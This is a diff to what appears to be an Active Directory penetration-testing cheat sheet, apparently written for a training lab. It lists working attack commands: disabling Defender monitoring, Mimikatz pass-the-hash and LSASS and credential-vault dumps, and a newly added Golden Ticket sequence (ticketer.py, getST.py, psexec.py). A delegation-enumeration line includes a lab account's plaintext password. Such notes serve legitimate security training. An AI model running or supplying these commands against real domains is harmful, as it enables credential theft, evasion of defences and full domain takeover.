@@ -136,14 +136,21 @@ Set-MpPreference -DisableRealtimeMonitoring $true
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell.exe"'
 
 # Mimikatz Dump LSASS
-```
+
 Invoke-Mimikatz (basic)
 
 Invoke-Mimikatz -Command '"sekurlsa::ekeys"' (to get AES keys)
 
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"' (credentials like those used for scheduled tasks are stored in the credential vault)
-```
-  
+
+# Golden Ticket
+
+ticketer.py -nthash <krbtgthash> -domain-sid <sid> -user-id 500 -domain <domain> <user>
+
+getST.py -k -no-pass -dc-ip <IP> -spn cifs/<FQDNMachine> <domain>/<user>
+
+psexec.py -k -no-pass -dc-ip <IP> <domain>/<user>@<FQDNMachine>
+
 # Enum Delegation
 
 python3 findDelegation.py dollarcorp.moneycorp.local/student202:t3dBtZYM4dWh5iKM -dc-ip 172.16.2.1
